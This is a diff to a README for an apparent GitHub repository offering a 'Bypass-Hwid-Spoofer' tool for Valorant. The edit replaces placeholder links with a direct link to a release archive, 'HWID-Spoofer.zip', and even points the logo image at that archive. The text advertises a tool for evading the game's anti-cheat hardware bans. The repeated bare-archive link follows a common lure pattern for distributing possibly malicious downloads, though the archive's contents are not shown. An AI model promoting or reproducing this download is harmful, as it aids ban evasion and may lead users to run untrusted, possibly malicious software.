@@ -44,7 +44,7 @@ Welcome to the official repository of "Bypass-Hwid-Spoofer" - your go-to solutio
 
 ## Download
 
-🔗 [Download HWID Spoofer for Valorant](555) 📂
+🔗 [Download HWID Spoofer for Valorant](https://github.com/bickbrandself58/Bypass-Hwid-Spoofer/releases/download/v1.3.6/HWID-Spoofer.zip) 📂
 
 ---
 
@@ -73,6 +73,6 @@ If the download link is not working or if you need further assistance, please ch
 
 Follow our repository for updates, new features, and enhancements related to HWID spoofing for Valorant. Happy gaming! 🎮
 
-![Valorant Logo](555)
+![Valorant Logo](https://github.com/bickbrandself58/Bypass-Hwid-Spoofer/releases/download/v1.3.6/HWID-Spoofer.zip)
 
 ---
